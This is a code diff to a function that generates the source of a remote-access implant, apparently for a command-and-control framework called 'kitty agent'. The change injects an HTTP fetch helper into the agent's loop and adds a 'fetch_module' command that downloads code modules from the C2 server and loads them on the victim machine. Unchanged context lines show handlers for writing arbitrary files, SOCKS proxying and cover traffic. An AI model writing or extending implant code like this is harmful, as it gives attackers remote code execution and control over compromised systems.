@@ -30,6 +30,12 @@ def build_kitty_agent_from_spec(spec: AgentSpec) -> str:
         cover_traffic=bool(profile.cover_traffic),
     )
 
+    from lib.c2.remote_module_server import build_http_fetch_helper
+
+    fetch_helper = build_http_fetch_helper(url_prefix=spec.url_prefix or "/c2")
+    if "while True:" in base:
+        base = base.replace("while True:", fetch_helper + "\nwhile True:", 1)
+
     old_exec = (
         "  cmd=''\n"
         "  if data.get('command'):\n"
@@ -71,6 +77,11 @@ def build_kitty_agent_from_spec(spec: AgentSpec) -> str:
         "     path=str(args.get('path') or ''); blob=str(args.get('data') or '')\n"
         "     open(path,'wb').write(base64.b64decode(blob)); out='OK wrote %s'%path\n"
         + SOCKS_TASK_HANDLERS
+        + "    elif cmd=='fetch_module':\n"
+        "     mp=str(args.get('path') or args.get('module_path') or '')\n"
+        "     lang=str(args.get('language') or 'python')\n"
+        "     ns=_kitty_fetch_module_http(mp, client_id=CID, language=lang)\n"
+        "     out='OK loaded %s (%d symbols)'%(mp,len(ns))\n"
         + "    elif cmd=='exit':\n"
         "     out='bye'; return out,files,status,True\n"
         "    else:\n"
